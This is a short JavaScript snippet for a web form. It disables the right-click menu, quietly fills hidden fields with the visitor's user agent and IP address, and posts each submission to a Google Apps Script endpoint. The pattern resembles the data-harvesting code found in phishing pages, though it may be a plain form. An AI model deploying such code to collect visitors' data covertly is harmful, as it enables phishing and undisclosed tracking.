var agent = navigator.userAgent;
document.addEventListener('contextmenu', event => event.preventDefault());
document.getElementById("device").value = agent;
function getIP(json) {
    document.getElementById("test").value = json.ip;
        }
const scriptURL = 'https://script.google.com/macros/s/AKfycbyYIvcJBwIvfOSN530tjgyxhGZMC4S789PmSi_Tc_tmWnGndBYHqAqw3DwW6THBF1wVPQ/exec'
const form = document.forms['Inputer']
form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    .then(response => console.log('Success!', response))
    .catch(error => console.error('Error!', error.message))
})
